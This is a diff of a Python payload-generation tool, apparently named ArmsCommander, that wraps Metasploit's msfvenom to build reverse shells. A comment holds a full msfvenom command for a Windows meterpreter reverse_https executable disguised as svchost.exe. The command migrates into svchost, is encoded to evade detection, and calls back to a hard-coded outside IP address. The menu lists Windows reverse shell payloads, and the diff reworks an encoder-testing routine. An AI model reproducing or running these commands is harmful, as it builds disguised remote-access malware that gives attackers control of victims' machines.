@@ -80,24 +80,9 @@ encoder_Dict = {
 payload_dir = '/root/ArmsCommander/payloads/'
 
 def test_Encoder_Effectiveness():
-
-    payload_to_test = str(raw_input("Enter the payload you want to test: "))
-    iterations = str(raw_input("Enter the amount of iterations to encode: "))
-
-    for key in encoder_Dict:
-        bad_Bytes = "x00"
-        encoder_Set = encoder_Dict[key]
-        cmd_String = 'msfvenom -p {0} -e {1} -i {2} -b "\{3}" -o /root/ArmsCommander/Encoder_Tested'.format(
-            payload_to_test,
-            encoder_Set,
-            iterations,
-            bad_Bytes
-        )
-        print colored(cmd_String,'red','on_white')
-        os.system(cmd_String)
-    print 'Encoder tests completed, please check console output'
+    os.system('python /root/ArmsCommander/remoteexploits/encoder_Tester.py')
     main()
-    return
+
 def Windows_INLINE():
         opt_Dict = {
             '1': 'windows/meterpreter_reverse_tcp',
@@ -231,7 +216,7 @@ def Windows_STAGED():
         #1. Meterpreter Reverse TCP
         #2. Meterpreter Reverse HTTP
         #3. Meterpreter Reverse HTTPS
-# msfvenom -p windows/meterpreter/reverse_https LHOST=52.53.180.45 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
+# msfvenom -p windows/meterpreter/reverse_https LHOST=54.241.135.223 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
 def Platform_Windows():
     opt_List = [
         '#0. Return to Main Menu',
@@ -963,6 +948,8 @@ def launch_msfconsole_handler():
     return
 
 def main():
+    text = colored('PAYLOAD CREATION MODE','red',attrs=['bold'])
+    print text
     opt_List = [
         '\n\t#0. Return to Main Menu',
         '#1. Windows Reverse Shells',
